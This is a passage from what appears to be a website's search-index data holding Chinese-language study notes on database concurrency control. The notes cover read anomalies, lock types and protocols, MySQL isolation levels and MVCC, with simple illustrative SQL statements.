\u64A4\u9500\u4E86\u8FD9\u6B21\u4FEE\u6539\uFF0C\u90A3\u4E48 T^2^ \u8BFB\u53D6\u7684\u6570\u636E\u662F\u810F\u6570\u636E\u3002"},{header:"\u4E0D\u53EF\u91CD\u590D\u8BFB",slug:"\u4E0D\u53EF\u91CD\u590D\u8BFB",content:"\u4E0D\u53EF\u91CD\u590D\u8BFB\u6307\u5728\u4E00\u4E2A\u4E8B\u52A1\u5185\u591A\u6B21\u8BFB\u53D6\u540C\u4E00\u6570\u636E\u96C6\u5408\u3002\u5728\u8FD9\u4E00\u4E8B\u52A1\u8FD8\u672A\u7ED3\u675F\u524D\uFF0C\u53E6\u4E00\u4E8B\u52A1\u4E5F\u8BBF\u95EE\u4E86\u8BE5\u540C\u4E00\u6570\u636E\u96C6\u5408\u5E76\u505A\u4E86\u4FEE\u6539\uFF0C\u7531\u4E8E\u7B2C\u4E8C\u4E2A\u4E8B\u52A1\u7684\u4FEE\u6539\uFF0C\u7B2C\u4E00\u6B21\u4E8B\u52A1\u7684\u4E24\u6B21\u8BFB\u53D6\u7684\u6570\u636E\u53EF\u80FD\u4E0D\u4E00\u81F4\u3002\u4F8B\u5982\uFF1AT^2^ \u8BFB\u53D6\u4E00\u4E2A\u6570\u636E\uFF0CT^1^ \u5BF9\u8BE5\u6570\u636E\u505A\u4E86\u4FEE\u6539\u3002\u5982\u679C T^2^ \u518D\u6B21\u8BFB\u53D6\u8FD9\u4E2A\u6570\u636E\uFF0C\u6B64\u65F6\u8BFB\u53D6\u7684\u7ED3\u679C\u548C\u7B2C\u4E00\u6B21\u8BFB\u53D6\u7684\u7ED3\u679C\u4E0D\u540C\u3002"},{header:"\u5E7B\u5F71\u8BFB",slug:"\u5E7B\u5F71\u8BFB",content:"\u5E7B\u8BFB\u672C\u8D28\u4E0A\u4E5F\u5C5E\u4E8E\u4E0D\u53EF\u91CD\u590D\u8BFB\u7684\u60C5\u51B5\uFF0CT^1^ \u8BFB\u53D6\u67D0\u4E2A\u8303\u56F4\u7684\u6570\u636E\uFF0CT^2^ \u5728\u8FD9\u4E2A\u8303\u56F4\u5185\u63D2\u5165\u65B0\u7684\u6570\u636E\uFF0CT^1^ \u518D\u6B21\u8BFB\u53D6\u8FD9\u4E2A\u8303\u56F4\u7684\u6570\u636E\uFF0C\u6B64\u65F6\u8BFB\u53D6\u7684\u7ED3\u679C\u548C\u548C\u7B2C\u4E00\u6B21\u8BFB\u53D6\u7684\u7ED3\u679C\u4E0D\u540C\u3002 \u4EA7\u751F\u5E76\u53D1\u4E0D\u4E00\u81F4\u6027\u95EE\u9898\u7684\u4E3B\u8981\u539F\u56E0\u662F\u7834\u574F\u4E86\u4E8B\u52A1\u7684\u9694\u79BB\u6027\uFF0C\u89E3\u51B3\u65B9\u6CD5\u662F\u901A\u8FC7\u5E76\u53D1\u63A7\u5236\u6765\u4FDD\u8BC1\u9694\u79BB\u6027\u3002\u5E76\u53D1\u63A7\u5236\u53EF\u4EE5\u901A\u8FC7\u5C01\u9501\u6765\u5B9E\u73B0\uFF0C\u4F46\u662F\u5C01\u9501\u64CD\u4F5C\u9700\u8981\u7528\u6237\u81EA\u5DF1\u63A7\u5236\uFF0C\u76F8\u5F53\u590D\u6742\u3002\u6570\u636E\u5E93\u7BA1\u7406\u7CFB\u7EDF\u63D0\u4F9B\u4E86\u4E8B\u52A1\u7684\u9694\u79BB\u7EA7\u522B\uFF0C\u8BA9\u7528\u6237\u4EE5\u4E00\u79CD\u66F4\u8F7B\u677E\u7684\u65B9\u5F0F\u5904\u7406\u5E76\u53D1\u4E00\u81F4\u6027\u95EE\u9898\u3002"},{header:"\u4E09\u3001\u5C01\u9501",slug:"\u4E09\u3001\u5C01\u9501",content:""},{header:"\u5C01\u9501\u7C92\u5EA6",slug:"\u5C01\u9501\u7C92\u5EA6",content:`MySQL \u4E2D\u63D0\u4F9B\u4E86\u4E24\u79CD\u5C01\u9501\u7C92\u5EA6\uFF1A\u884C\u7EA7\u9501\u4EE5\u53CA\u8868\u7EA7\u9501\u3002
\u5E94\u8BE5\u5C3D\u91CF\u53EA\u9501\u5B9A\u9700\u8981\u4FEE\u6539\u7684\u90A3\u90E8\u5206\u6570\u636E\uFF0C\u800C\u4E0D\u662F\u6240\u6709\u7684\u8D44\u6E90\u3002\u9501\u5B9A\u7684\u6570\u636E\u91CF\u8D8A\u5C11\uFF0C\u53D1\u751F\u9501\u4E89\u7528\u7684\u53EF\u80FD\u5C31\u8D8A\u5C0F\uFF0C\u7CFB\u7EDF\u7684\u5E76\u53D1\u7A0B\u5EA6\u5C31\u8D8A\u9AD8\u3002
\u4F46\u662F\u52A0\u9501\u9700\u8981\u6D88\u8017\u8D44\u6E90\uFF0C\u9501\u7684\u5404\u79CD\u64CD\u4F5C\uFF08\u5305\u62EC\u83B7\u53D6\u9501\u3001\u91CA\u653E\u9501\u3001\u4EE5\u53CA\u68C0\u67E5\u9501\u72B6\u6001\uFF09\u90FD\u4F1A\u589E\u52A0\u7CFB\u7EDF\u5F00\u9500\u3002\u56E0\u6B64\u5C01\u9501\u7C92\u5EA6\u8D8A\u5C0F\uFF0C\u7CFB\u7EDF\u5F00\u9500\u5C31\u8D8A\u5927\u3002
\u5728\u9009\u62E9\u5C01\u9501\u7C92\u5EA6\u65F6\uFF0C\u9700\u8981\u5728\u9501\u5F00\u9500\u548C\u5E76\u53D1\u7A0B\u5EA6\u4E4B\u95F4\u505A\u4E00\u4E2A\u6743\u8861\u3002`},{header:"\u5C01\u9501\u7C7B\u578B",slug:"\u5C01\u9501\u7C7B\u578B",content:""},{header:"1. \u8BFB\u5199\u9501",slug:"_1-\u8BFB\u5199\u9501",content:`\u4E92\u65A5\u9501\uFF08Exclusive\uFF09\uFF0C\u7B80\u5199\u4E3A X \u9501\uFF0C\u53C8\u79F0\u5199\u9501\u3002
\u5171\u4EAB\u9501\uFF08Shared\uFF09\uFF0C\u7B80\u5199\u4E3A S \u9501\uFF0C\u53C8\u79F0\u8BFB\u9501\u3002 \u6709\u4EE5\u4E0B\u4E24\u4E2A\u89C4\u5B9A\uFF1A \u4E00\u4E2A\u4E8B\u52A1\u5BF9\u6570\u636E\u5BF9\u8C61 A \u52A0\u4E86 X \u9501\uFF0C\u5C31\u53EF\u4EE5\u5BF9 A \u8FDB\u884C\u8BFB\u53D6\u548C\u66F4\u65B0\u3002\u52A0\u9501\u671F\u95F4\u5176\u5B83\u4E8B\u52A1\u4E0D\u80FD\u5BF9 A \u52A0\u4EFB\u4F55\u9501\u3002
\u4E00\u4E2A\u4E8B\u52A1\u5BF9\u6570\u636E\u5BF9\u8C61 A \u52A0\u4E86 S \u9501\uFF0C\u53EF\u4EE5\u5BF9 A \u8FDB\u884C\u8BFB\u53D6\u64CD\u4F5C\uFF0C\u4F46\u662F\u4E0D\u80FD\u8FDB\u884C\u66F4\u65B0\u64CD\u4F5C\u3002\u52A0\u9501\u671F\u95F4\u5176\u5B83\u4E8B\u52A1\u80FD\u5BF9 A \u52A0 S \u9501\uFF0C\u4F46\u662F\u4E0D\u80FD\u52A0 X \u9501\u3002 \u9501\u7684\u517C\u5BB9\u5173\u7CFB\u5982\u4E0B\uFF1A`},{header:"2. \u610F\u5411\u9501",slug:"_2-\u610F\u5411\u9501",content:`\u4F7F\u7528\u610F\u5411\u9501\uFF08Intention Locks\uFF09\u53EF\u4EE5\u66F4\u5BB9\u6613\u5730\u652F\u6301\u591A\u7C92\u5EA6\u5C01\u9501\u3002
\u5728\u5B58\u5728\u884C\u7EA7\u9501\u548C\u8868\u7EA7\u9501\u7684\u60C5\u51B5\u4E0B\uFF0C\u4E8B\u52A1 T \u60F3\u8981\u5BF9\u8868 A \u52A0 X \u9501\uFF0C\u5C31\u9700\u8981\u5148\u68C0\u6D4B\u662F\u5426\u6709\u5176\u5B83\u4E8B\u52A1\u5BF9\u8868 A \u6216\u8005\u8868 A \u4E2D\u7684\u4EFB\u610F\u4E00\u884C\u52A0\u4E86\u9501\uFF0C\u90A3\u4E48\u5C31\u9700\u8981\u5BF9\u8868 A \u7684\u6BCF\u4E00\u884C\u90FD\u68C0\u6D4B\u4E00\u6B21\uFF0C\u8FD9\u662F\u975E\u5E38\u8017\u65F6\u7684\u3002
\u610F\u5411\u9501\u5728\u539F\u6765\u7684 X/S \u9501\u4E4B\u4E0A\u5F15\u5165\u4E86 IX/IS\uFF0CIX/IS \u90FD\u662F\u8868\u9501\uFF0C\u7528\u6765\u8868\u793A\u4E00\u4E2A\u4E8B\u52A1\u60F3\u8981\u5728\u8868\u4E2D\u7684\u67D0\u4E2A\u6570\u636E\u884C\u4E0A\u52A0 X \u9501\u6216 S \u9501\u3002\u6709\u4EE5\u4E0B\u4E24\u4E2A\u89C4\u5B9A\uFF1A \u4E00\u4E2A\u4E8B\u52A1\u5728\u83B7\u5F97\u67D0\u4E2A\u6570\u636E\u884C\u5BF9\u8C61\u7684 S \u9501\u4E4B\u524D\uFF0C\u5FC5\u987B\u5148\u83B7\u5F97\u8868\u7684 IS \u9501\u6216\u8005\u66F4\u5F3A\u7684\u9501\uFF1B
\u4E00\u4E2A\u4E8B\u52A1\u5728\u83B7\u5F97\u67D0\u4E2A\u6570\u636E\u884C\u5BF9\u8C61\u7684 X \u9501\u4E4B\u524D\uFF0C\u5FC5\u987B\u5148\u83B7\u5F97\u8868\u7684 IX \u9501\u3002 \u901A\u8FC7\u5F15\u5165\u610F\u5411\u9501\uFF0C\u4E8B\u52A1 T \u60F3\u8981\u5BF9\u8868 A \u52A0 X \u9501\uFF0C\u53EA\u9700\u8981\u5148\u68C0\u6D4B\u662F\u5426\u6709\u5176\u5B83\u4E8B\u52A1\u5BF9\u8868 A \u52A0\u4E86 X/IX/S/IS \u9501\uFF0C\u5982\u679C\u52A0\u4E86\u5C31\u8868\u793A\u6709\u5176\u5B83\u4E8B\u52A1\u6B63\u5728\u4F7F\u7528\u8FD9\u4E2A\u8868\u6216\u8005\u8868\u4E2D\u67D0\u4E00\u884C\u7684\u9501\uFF0C\u56E0\u6B64\u4E8B\u52A1 T \u52A0 X \u9501\u5931\u8D25\u3002
\u5404\u79CD\u9501\u7684\u517C\u5BB9\u5173\u7CFB\u5982\u4E0B\uFF1A \u89E3\u91CA\u5982\u4E0B\uFF1A \u4EFB\u610F IS/IX \u9501\u4E4B\u95F4\u90FD\u662F\u517C\u5BB9\u7684\uFF0C\u56E0\u4E3A\u5B83\u4EEC\u53EA\u8868\u793A\u60F3\u8981\u5BF9\u8868\u52A0\u9501\uFF0C\u800C\u4E0D\u662F\u771F\u6B63\u52A0\u9501\uFF1B
\u8FD9\u91CC\u517C\u5BB9\u5173\u7CFB\u9488\u5BF9\u7684\u662F\u8868\u7EA7\u9501\uFF0C\u800C\u8868\u7EA7\u7684 IX \u9501\u548C\u884C\u7EA7\u7684 X \u9501\u517C\u5BB9\uFF0C\u4E24\u4E2A\u4E8B\u52A1\u53EF\u4EE5\u5BF9\u4E24\u4E2A\u6570\u636E\u884C\u52A0 X \u9501\u3002\uFF08\u4E8B\u52A1 T^1^ \u60F3\u8981\u5BF9\u6570\u636E\u884C R^1^ \u52A0 X \u9501\uFF0C\u4E8B\u52A1 T^2^ \u60F3\u8981\u5BF9\u540C\u4E00\u4E2A\u8868\u7684\u6570\u636E\u884C R^2^ \u52A0 X \u9501\uFF0C\u4E24\u4E2A\u4E8B\u52A1\u90FD\u9700\u8981\u5BF9\u8BE5\u8868\u52A0 IX \u9501\uFF0C\u4F46\u662F IX \u9501\u662F\u517C\u5BB9\u7684\uFF0C\u5E76\u4E14 IX \u9501\u4E0E\u884C\u7EA7\u7684 X \u9501\u4E5F\u662F\u517C\u5BB9\u7684\uFF0C\u56E0\u6B64\u4E24\u4E2A\u4E8B\u52A1\u90FD\u80FD\u52A0\u9501\u6210\u529F\uFF0C\u5BF9\u540C\u4E00\u4E2A\u8868\u4E2D\u7684\u4E24\u4E2A\u6570\u636E\u884C\u505A\u4FEE\u6539\u3002\uFF09`},{header:"\u5C01\u9501\u534F\u8BAE",slug:"\u5C01\u9501\u534F\u8BAE",content:""},{header:"1. \u4E09\u7EA7\u5C01\u9501\u534F\u8BAE",slug:"_1-\u4E09\u7EA7\u5C01\u9501\u534F\u8BAE",content:`\u4E00\u7EA7\u5C01\u9501\u534F\u8BAE
\u4E8B\u52A1 T \u8981\u4FEE\u6539\u6570\u636E A \u65F6\u5FC5\u987B\u52A0 X \u9501\uFF0C\u76F4\u5230 T \u7ED3\u675F\u624D\u91CA\u653E\u9501\u3002
\u53EF\u4EE5\u89E3\u51B3\u4E22\u5931\u4FEE\u6539\u95EE\u9898\uFF0C\u56E0\u4E3A\u4E0D\u80FD\u540C\u65F6\u6709\u4E24\u4E2A\u4E8B\u52A1\u5BF9\u540C\u4E00\u4E2A\u6570\u636E\u8FDB\u884C\u4FEE\u6539\uFF0C\u90A3\u4E48\u4E8B\u52A1\u7684\u4FEE\u6539\u5C31\u4E0D\u4F1A\u88AB\u8986\u76D6\u3002 \u4E8C\u7EA7\u5C01\u9501\u534F\u8BAE
\u5728\u4E00\u7EA7\u7684\u57FA\u7840\u4E0A\uFF0C\u8981\u6C42\u8BFB\u53D6\u6570\u636E A \u65F6\u5FC5\u987B\u52A0 S \u9501\uFF0C\u8BFB\u53D6\u5B8C\u9A6C\u4E0A\u91CA\u653E S \u9501\u3002
\u53EF\u4EE5\u89E3\u51B3\u8BFB\u810F\u6570\u636E\u95EE\u9898\uFF0C\u56E0\u4E3A\u5982\u679C\u4E00\u4E2A\u4E8B\u52A1\u5728\u5BF9\u6570\u636E A \u8FDB\u884C\u4FEE\u6539\uFF0C\u6839\u636E 1 \u7EA7\u5C01\u9501\u534F\u8BAE\uFF0C\u4F1A\u52A0 X \u9501\uFF0C\u90A3\u4E48\u5C31\u4E0D\u80FD\u518D\u52A0 S \u9501\u4E86\uFF0C\u4E5F\u5C31\u662F\u4E0D\u4F1A\u8BFB\u5165\u6570\u636E\u3002 \u4E09\u7EA7\u5C01\u9501\u534F\u8BAE
\u5728\u4E8C\u7EA7\u7684\u57FA\u7840\u4E0A\uFF0C\u8981\u6C42\u8BFB\u53D6\u6570\u636E A \u65F6\u5FC5\u987B\u52A0 S \u9501\uFF0C\u76F4\u5230\u4E8B\u52A1\u7ED3\u675F\u4E86\u624D\u80FD\u91CA\u653E S \u9501\u3002
\u53EF\u4EE5\u89E3\u51B3\u4E0D\u53EF\u91CD\u590D\u8BFB\u7684\u95EE\u9898\uFF0C\u56E0\u4E3A\u8BFB A \u65F6\uFF0C\u5176\u5B83\u4E8B\u52A1\u4E0D\u80FD\u5BF9 A \u52A0 X \u9501\uFF0C\u4ECE\u800C\u907F\u514D\u4E86\u5728\u8BFB\u7684\u671F\u95F4\u6570\u636E\u53D1\u751F\u6539\u53D8\u3002`},{header:"2. \u4E24\u6BB5\u9501\u534F\u8BAE",slug:"_2-\u4E24\u6BB5\u9501\u534F\u8BAE",content:`\u52A0\u9501\u548C\u89E3\u9501\u5206\u4E3A\u4E24\u4E2A\u9636\u6BB5\u8FDB\u884C\u3002
\u53EF\u4E32\u884C\u5316\u8C03\u5EA6\u662F\u6307\uFF0C\u901A\u8FC7\u5E76\u53D1\u63A7\u5236\uFF0C\u4F7F\u5F97\u5E76\u53D1\u6267\u884C\u7684\u4E8B\u52A1\u7ED3\u679C\u4E0E\u67D0\u4E2A\u4E32\u884C\u6267\u884C\u7684\u4E8B\u52A1\u7ED3\u679C\u76F8\u540C\u3002\u4E32\u884C\u6267\u884C\u7684\u4E8B\u52A1\u4E92\u4E0D\u5E72\u6270\uFF0C\u4E0D\u4F1A\u51FA\u73B0\u5E76\u53D1\u4E00\u81F4\u6027\u95EE\u9898\u3002
\u4E8B\u52A1\u9075\u5FAA\u4E24\u6BB5\u9501\u534F\u8BAE\u662F\u4FDD\u8BC1\u53EF\u4E32\u884C\u5316\u8C03\u5EA6\u7684\u5145\u5206\u6761\u4EF6\u3002\u4F8B\u5982\u4EE5\u4E0B\u64CD\u4F5C\u6EE1\u8DB3\u4E24\u6BB5\u9501\u534F\u8BAE\uFF0C\u5B83\u662F\u53EF\u4E32\u884C\u5316\u8C03\u5EA6\u3002
lock-x(A)...lock-s(B)...lock-s(C)...unlock(A)...unlock(C)...unlock(B)
\u4F46\u4E0D\u662F\u5FC5\u8981\u6761\u4EF6\uFF0C\u4F8B\u5982\u4EE5\u4E0B\u64CD\u4F5C\u4E0D\u6EE1\u8DB3\u4E24\u6BB5\u9501\u534F\u8BAE\uFF0C\u4F46\u5B83\u8FD8\u662F\u53EF\u4E32\u884C\u5316\u8C03\u5EA6\u3002
lock-x(A)...unlock(A)...lock-s(B)...unlock(B)...lock-s(C)...unlock(C)`},{header:"MySQL \u9690\u5F0F\u4E0E\u663E\u5F0F\u9501\u5B9A",slug:"mysql-\u9690\u5F0F\u4E0E\u663E\u5F0F\u9501\u5B9A",content:`MySQL \u7684 InnoDB \u5B58\u50A8\u5F15\u64CE\u91C7\u7528\u4E24\u6BB5\u9501\u534F\u8BAE\uFF0C\u4F1A\u6839\u636E\u9694\u79BB\u7EA7\u522B\u5728\u9700\u8981\u7684\u65F6\u5019\u81EA\u52A8\u52A0\u9501\uFF0C\u5E76\u4E14\u6240\u6709\u7684\u9501\u90FD\u662F\u5728\u540C\u4E00\u65F6\u523B\u88AB\u91CA\u653E\uFF0C\u8FD9\u88AB\u79F0\u4E3A\u9690\u5F0F\u9501\u5B9A\u3002
InnoDB \u4E5F\u53EF\u4EE5\u4F7F\u7528\u7279\u5B9A\u7684\u8BED\u53E5\u8FDB\u884C\u663E\u793A\u9501\u5B9A\uFF1A
SELECT ... LOCK In SHARE MODE;
SELECT ... FOR UPDATE;`},{header:"\u56DB\u3001\u9694\u79BB\u7EA7\u522B",slug:"\u56DB\u3001\u9694\u79BB\u7EA7\u522B",content:""},{header:"\u672A\u63D0\u4EA4\u8BFB\uFF08READ UNCOMMITTED\uFF09",slug:"\u672A\u63D0\u4EA4\u8BFB-read-uncommitted",content:"\u4E8B\u52A1\u4E2D\u7684\u4FEE\u6539\uFF0C\u5373\u4F7F\u6CA1\u6709\u63D0\u4EA4\uFF0C\u5BF9\u5176\u5B83\u4E8B\u52A1\u4E5F\u662F\u53EF\u89C1\u7684\u3002"},{header:"\u63D0\u4EA4\u8BFB\uFF08READ COMMITTED\uFF09",slug:"\u63D0\u4EA4\u8BFB-read-committed",content:"\u4E00\u4E2A\u4E8B\u52A1\u53EA\u80FD\u8BFB\u53D6\u5DF2\u7ECF\u63D0\u4EA4\u7684\u4E8B\u52A1\u6240\u505A\u7684\u4FEE\u6539\u3002\u6362\u53E5\u8BDD\u8BF4\uFF0C\u4E00\u4E2A\u4E8B\u52A1\u6240\u505A\u7684\u4FEE\u6539\u5728\u63D0\u4EA4\u4E4B\u524D\u5BF9\u5176\u5B83\u4E8B\u52A1\u662F\u4E0D\u53EF\u89C1\u7684\u3002"},{header:"\u53EF\u91CD\u590D\u8BFB\uFF08REPEATABLE READ\uFF09",slug:"\u53EF\u91CD\u590D\u8BFB-repeatable-read",content:"\u4FDD\u8BC1\u5728\u540C\u4E00\u4E2A\u4E8B\u52A1\u4E2D\u591A\u6B21\u8BFB\u53D6\u540C\u4E00\u6570\u636E\u7684\u7ED3\u679C\u662F\u4E00\u6837\u7684\u3002"},{header:"\u53EF\u4E32\u884C\u5316\uFF08SERIALIZABLE\uFF09",slug:"\u53EF\u4E32\u884C\u5316-serializable",content:`\u5F3A\u5236\u4E8B\u52A1\u4E32\u884C\u6267\u884C\uFF0C\u8FD9\u6837\u591A\u4E2A\u4E8B\u52A1\u4E92\u4E0D\u5E72\u6270\uFF0C\u4E0D\u4F1A\u51FA\u73B0\u5E76\u53D1\u4E00\u81F4\u6027\u95EE\u9898\u3002
\u8BE5\u9694\u79BB\u7EA7\u522B\u9700\u8981\u52A0\u9501\u5B9E\u73B0\uFF0C\u56E0\u4E3A\u8981\u4F7F\u7528\u52A0\u9501\u673A\u5236\u4FDD\u8BC1\u540C\u4E00\u65F6\u95F4\u53EA\u6709\u4E00\u4E2A\u4E8B\u52A1\u6267\u884C\uFF0C\u4E5F\u5C31\u662F\u4FDD\u8BC1\u4E8B\u52A1\u4E32\u884C\u6267\u884C\u3002`},{header:"\u4E94\u3001\u591A\u7248\u672C\u5E76\u53D1\u63A7\u5236",slug:"\u4E94\u3001\u591A\u7248\u672C\u5E76\u53D1\u63A7\u5236",content:"\u591A\u7248\u672C\u5E76\u53D1\u63A7\u5236\uFF08Multi-Version Concurrency Control, MVCC\uFF09\u662F MySQL \u7684 InnoDB \u5B58\u50A8\u5F15\u64CE\u5B9E\u73B0\u9694\u79BB\u7EA7\u522B\u7684\u4E00\u79CD\u5177\u4F53\u65B9\u5F0F\uFF0C\u7528\u4E8E\u5B9E\u73B0\u63D0\u4EA4\u8BFB\u548C\u53EF\u91CD\u590D\u8BFB\u8FD9\u4E24\u79CD\u9694\u79BB\u7EA7\u522B\u3002\u800C\u672A\u63D0\u4EA4\u8BFB\u9694\u79BB\u7EA7\u522B\u603B\u662F\u8BFB\u53D6\u6700\u65B0\u7684\u6570\u636E\u884C\uFF0C\u8981\u6C42\u5F88\u4F4E\uFF0C\u65E0\u9700\u4F7F\u7528 MVCC\u3002\u53EF\u4E32\u884C\u5316\u9694\u79BB\u7EA7\u522B\u9700\u8981\u5BF9\u6240\u6709\u8BFB\u53D6\u7684\u884C\u90FD\u52A0\u9501\uFF0C\u5355\u7EAF\u4F7F\u7528 MVCC \u65E0\u6CD5\u5B9E\u73B0\u3002"},{header:"\u57FA\u672C\u601D\u60F3",slug:"\u57FA\u672C\u601D\u60F3",content:`\u5728\u5C01\u9501\u4E00\u8282\u4E2D\u63D0\u5230\uFF0C\u52A0\u9501\u80FD\u89E3\u51B3\u591A\u4E2A\u4E8B\u52A1\u540C\u65F6\u6267\u884C\u65F6\u51FA\u73B0\u7684\u5E76\u53D1\u4E00\u81F4\u6027\u95EE\u9898\u3002\u5728\u5B9E\u9645\u573A\u666F\u4E2D\u8BFB\u64CD\u4F5C\u5F80\u5F80\u591A\u4E8E\u5199\u64CD\u4F5C\uFF0C\u56E0\u6B64\u53C8\u5F15\u5165\u4E86\u8BFB\u5199\u9501\u6765\u907F\u514D\u4E0D\u5FC5\u8981\u7684\u52A0\u9501\u64CD\u4F5C\uFF0C\u4F8B\u5982\u8BFB\u548C\u8BFB\u6CA1\u6709\u4E92\u65A5\u5173\u7CFB\u3002\u8BFB\u5199\u9501\u4E2D\u8BFB\u548C\u5199\u64CD\u4F5C\u4ECD\u7136\u662F\u4E92\u65A5\u7684\uFF0C\u800C MVCC \u5229\u7528\u4E86\u591A\u7248\u672C\u7684\u601D\u60F3\uFF0C\u5199\u64CD\u4F5C\u66F4\u65B0\u6700\u65B0\u7684\u7248\u672C\u5FEB\u7167\uFF0C\u800C\u8BFB\u64CD\u4F5C\u53BB\u8BFB\u65E7\u7248\u672C\u5FEB\u7167\uFF0C\u6CA1\u6709\u4E92\u65A5\u5173\u7CFB\uFF0C\u8FD9\u4E00\u70B9\u548C CopyOnWrite \u7C7B\u4F3C\u3002
\u5728 MVCC \u4E2D\u4E8B\u52A1\u7684\u4FEE\u6539\u64CD\u4F5C\uFF08DELETE\u3001INSERT\u3001UPDATE\uFF09\u4F1A\u4E3A\u6570\u636E\u884C\u65B0\u589E\u4E00\u4E2A\u7248\u672C\u5FEB\u7167\u3002
\u810F\u8BFB\u548C\u4E0D\u53EF\u91CD\u590D\u8BFB\u6700\u6839\u672C\u7684\u539F\u56E0\u662F\u4E8B\u52A1\u8BFB\u53D6\u5230\u5176\u5B83\u4E8B\u52A1\u672A\u63D0\u4EA4\u7684\u4FEE\u6539\u3002\u5728\u4E8B\u52A1\u8FDB\u884C\u8BFB\u53D6\u64CD\u4F5C\u65F6\uFF0C\u4E3A\u4E86\u89E3\u51B3\u810F\u8BFB\u548C\u4E0D\u53EF\u91CD\u590D\u8BFB\u95EE\u9898\uFF0CMVCC \u89C4\u5B9A\u53EA\u80FD\u8BFB\u53D6\u5DF2\u7ECF\u63D0\u4EA4\u7684\u5FEB\u7167\u3002\u5F53\u7136\u4E00\u4E2A\u4E8B\u52A1\u53EF\u4EE5\u8BFB\u53D6\u81EA\u8EAB\u672A\u63D0\u4EA4\u7684\u5FEB\u7167\uFF0C\u8FD9\u4E0D\u7B97\u662F\u810F\u8BFB\u3002`},{header:"\u7248\u672C\u53F7",slug:"\u7248\u672C\u53F7",content:`\u7CFB\u7EDF\u7248\u672C\u53F7 SYS_ID\uFF1A\u662F\u4E00\u4E2A\u9012\u589E\u7684\u6570\u5B57\uFF0C\u6BCF\u5F00\u59CB\u4E00\u4E2A\u65B0\u7684\u4E8B\u52A1\uFF0C\u7CFB\u7EDF\u7248\u672C\u53F7\u5C31\u4F1A\u81EA\u52A8\u9012\u589E\u3002
\u4E8B\u52A1\u7248\u672C\u53F7 TRX_ID \uFF1A\u4E8B\u52A1\u5F00\u59CB\u65F6\u7684\u7CFB\u7EDF\u7248\u672C\u53F7\u3002`},{header:"Undo \u65E5\u5FD7",slug:"undo-\u65E5\u5FD7",content:`MVCC \u7684\u591A\u7248\u672C\u6307\u7684\u662F\u591A\u4E2A\u7248\u672C\u7684\u5FEB\u7167\uFF0C\u5FEB\u7167\u5B58\u50A8\u5728 Undo \u65E5\u5FD7\u4E2D\uFF0C\u8BE5\u65E5\u5FD7\u901A\u8FC7\u56DE\u6EDA\u6307\u9488 ROLL_PTR \u628A\u4E00\u4E2A\u6570\u636E\u884C\u7684\u6240\u6709\u5FEB\u7167\u8FDE\u63A5\u8D77\u6765\u3002
\u4F8B\u5982\u5728 MySQL \u521B\u5EFA\u4E00\u4E2A\u8868 t\uFF0C\u5305\u542B\u4E3B\u952E id \u548C\u4E00\u4E2A\u5B57\u6BB5 x\u3002\u6211\u4EEC\u5148\u63D2\u5165\u4E00\u4E2A\u6570\u636E\u884C\uFF0C\u7136\u540E\u5BF9\u8BE5\u6570\u636E\u884C\u6267\u884C\u4E24\u6B21\u66F4\u65B0\u64CD\u4F5C\u3002
INSERT INTO t(id, x) VALUES(1, "a");
UPDATE t SET x="b" WHERE id=1;
UPDATE t SET x="c" WHERE id=1;
\u56E0\u4E3A\u6CA1\u6709\u4F7F\u7528 START TRANSACTION \u5C06\u4E0A\u9762\u7684\u64CD\u4F5C\u5F53\u6210\u4E00\u4E2A\u4E8B\u52A1\u6765\u6267\u884C\uFF0C\u6839\u636E MySQL \u7684 AUTOCOMMIT \u673A\u5236\uFF0C\u6BCF\u4E2A\u64CD\u4F5C\u90FD\u4F1A\u88AB\u5F53\u6210\u4E00\u4E2A\u4E8B\u52A1\u6765\u6267\u884C\uFF0C\u6240\u4EE5\u4E0A\u9762\u7684\u64CD\u4F5C\u603B\u5171\u6D89\u53CA\u5230\u4E09\u4E2A\u4E8B\u52A1\u3002\u5FEB\u7167\u4E2D\u9664\u4E86\u8BB0\u5F55\u4E8B\u52A1\u7248\u672C\u53F7 TRX_ID \u548C\u64CD\u4F5C\u4E4B\u5916\uFF0C\u8FD8\u8BB0\u5F55\u4E86\u4E00\u4E2A bit \u7684 DEL \u5B57\u6BB5\uFF0C\u7528\u4E8E\u6807\u8BB0\u662F\u5426\u88AB\u5220\u9664\u3002 INSERT\u3001UPDATE\u3001DELETE \u64CD\u4F5C\u4F1A\u521B\u5EFA\u4E00\u4E2A\u65E5\u5FD7\uFF0C\u5E76\u5C06\u4E8B\u52A1\u7248\u672C\u53F7 TRX_ID \u5199\u5165\u3002DELETE \u53EF\u4EE5\u770B\u6210\u662F\u4E00\u4E2A\u7279\u6B8A\u7684 UPDATE\uFF0C\u8FD8\u4F1A\u989D\u5916\u5C06 DEL \u5B57\u6BB5\u8BBE\u7F6E\u4E3A 1\u3002`},{header:"ReadView",slug:"readview",content:`MVCC \u7EF4\u62A4\u4E86\u4E00\u4E2A ReadView \u7ED3\u6784\uFF0C\u4E3B\u8981\u5305\u542B\u4E86\u5F53\u524D\u7CFB\u7EDF\u672A\u63D0\u4EA4\u7684\u4E8B\u52A1\u5217\u8868 TRX_IDs {TRX_ID_1, TRX_ID_2, ...}\uFF0C\u8FD8\u6709\u8BE5\u5217\u8868\u7684\u6700\u5C0F\u503C TRX_ID_MIN \u548C TRX_ID_MAX\u3002 \u5728\u8FDB\u884C SELECT \u64CD\u4F5C\u65F6\uFF0C\u6839\u636E\u6570\u636E\u884C\u5FEB\u7167\u7684 TRX_ID \u4E0E TRX_ID_MIN \u548C TRX_ID_MAX \u4E4B\u95F4\u7684\u5173\u7CFB\uFF0C\u4ECE\u800C\u5224\u65AD\u6570\u636E\u884C\u5FEB\u7167\u662F\u5426\u53EF\u4EE5\u4F7F\u7528\uFF1A TRX_ID < TRX_ID_MIN\uFF0C\u8868\u793A\u8BE5\u6570\u636E\u884C\u5FEB\u7167\u65F6\u5728\u5F53\u524D\u6240\u6709\u672A\u63D0\u4EA4\u4E8B\u52A1\u4E4B\u524D\u8FDB\u884C\u66F4\u6539\u7684\uFF0C\u56E0\u6B64\u53EF\u4EE5\u4F7F\u7528\u3002 TRX_ID > TRX_ID_MAX\uFF0C\u8868\u793A\u8BE5\u6570\u636E\u884C\u5FEB\u7167\u662F\u5728\u4E8B\u52A1\u542F\u52A8\u4E4B\u540E\u88AB\u66F4\u6539\u7684\uFF0C\u56E0\u6B64\u4E0D\u53EF\u4F7F\u7528\u3002 TRX_ID_MIN <= TRX_ID <= TRX_ID_MAX\uFF0C\u9700\u8981\u6839\u636E\u9694\u79BB\u7EA7\u522B\u518D\u8FDB\u884C\u5224\u65AD\uFF1A \u63D0\u4EA4\u8BFB\uFF1A\u5982\u679C TRX_ID \u5728 